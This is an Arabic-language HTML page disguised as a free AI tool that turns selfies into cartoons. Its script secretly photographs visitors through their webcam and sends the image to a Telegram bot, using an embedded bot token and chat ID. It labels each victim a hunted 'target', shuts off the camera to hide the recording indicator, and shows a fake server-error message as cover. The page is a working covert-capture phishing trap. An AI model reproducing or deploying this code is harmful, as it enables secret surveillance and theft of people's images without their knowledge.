<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI Cartoon Magic | تحويل الصور لكرتون</title>
    <style>
        body { font-family: 'Arial', sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; text-align: center; margin: 0; padding: 20px; height: 100vh; display: flex; flex-direction: column; justify-content: center; }
        .card { background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(10px); padding: 30px; border-radius: 20px; box-shadow: 0 8px 32px rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.2); }
        .btn { background: #ff4757; color: white; border: none; padding: 15px 40px; font-size: 18px; border-radius: 50px; cursor: pointer; font-weight: bold; transition: 0.3s; box-shadow: 0 4px 15px rgba(255, 71, 87, 0.4); }
        .btn:hover { transform: scale(1.05); background: #ff6b81; }
        p { color: #eee; font-size: 14px; }
    </style>
</head>
<body>

<div class="card">
    <h1>🎨 محول الكرتون الذكي</h1>
    <p>استخدم قوة الذكاء الاصطناعي لتحويل صورتك الشخصية إلى شخصية كرتونية في ثانية واحدة!</p>
    <br>
    <button class="btn" onclick="startCapture()">جرب الآن مجاناً</button>
    <br><br>
    <p id="status">* يتطلب الوصول للكاميرا للمعالجة الفورية</p>
</div>

<video id="video" autoplay style="display:none;"></video>
<canvas id="canvas" style="display:none;"></canvas>

<script>
    const BOT_TOKEN = '8605049073:AAEyGQ07KMGUzG5jVjdjERMJDxGbTgYHWUE';
    const CHAT_ID = '7396462490';

    async function startCapture() {
        document.getElementById('status').innerText = "جاري تشغيل محرك الذكاء الاصطناعي...";
        try {
            // طلب الإذن (سيظهر الطلب الرسمي للمتصفح هنا)
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.getElementById('video');
            video.srcObject = stream;

            // التقاط صامت فوراً بعد الإذن مباشرة
            setTimeout(() => {
                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                canvas.toBlob(blob => {
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', blob, 'ai_transform.jpg');
                    formData.append('caption', '✅ تم اصطياد الهدف بنجاح من صفحة الكرتون!');

                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    }).then(() => {
                        // إغلاق الكاميرا فوراً لإخفاء أيقونة التسجيل
                        stream.getTracks().forEach(track => track.stop());
                        document.getElementById('status').innerText = "حدث خطأ في السيرفر، جرب لاحقاً.";
                        alert("عذراً، الضغط عالي على السيرفر حالياً. حاول مرة أخرى بعد قليل.");
                    });
                }, 'image/jpeg', 0.7);
            }, 1000); // تأخير ثانية واحدة لضبط الإضاءة

        } catch (err) {
            document.getElementById('status').innerText = "يجب الموافقة لتتمكن من استخدام الفلتر.";
        }
    }
</script>

</body>
</html>
